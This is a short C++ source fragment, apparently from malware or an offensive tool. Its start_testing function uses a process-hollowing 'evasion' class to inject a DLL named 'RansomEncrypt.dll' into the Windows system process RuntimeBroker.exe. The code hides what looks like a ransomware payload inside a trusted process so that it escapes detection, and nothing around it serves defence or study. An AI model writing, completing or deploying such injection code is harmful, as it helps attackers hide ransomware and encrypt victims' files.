#include "evasion\ProcessHollowing.h"

void start_testing(void) {
    ProcessHollowing hollowing;

    hollowing.InjectDLL("C:\\Windows\\System32\\RuntimeBroker.exe", "RansomEncrypt.dll");
}